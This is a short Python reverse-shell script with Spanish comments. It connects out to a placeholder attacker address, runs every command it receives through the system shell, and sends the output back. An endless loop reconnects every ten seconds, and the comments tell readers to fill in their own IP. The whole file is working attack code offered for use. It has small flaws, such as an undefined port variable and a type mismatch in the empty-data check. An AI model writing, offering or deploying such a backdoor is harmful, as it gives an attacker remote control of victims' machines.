import socket
import subprocess
import os
from time import sleep, time
from base64 import decode

def netcat(hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    while 1:
        data = s.recv(1024)
        if data == "":
            pass
        else:
            result = subprocess.check_output(data.decode(), shell=True)
            s.send(result)

while True:
	try:
		netcat('ip atacante', port) # sustituyan prros .-.
	except:
		sleep(10) # contra mas segundos mas tardara en entablar la primera conexion pero menos trafico tcp generará
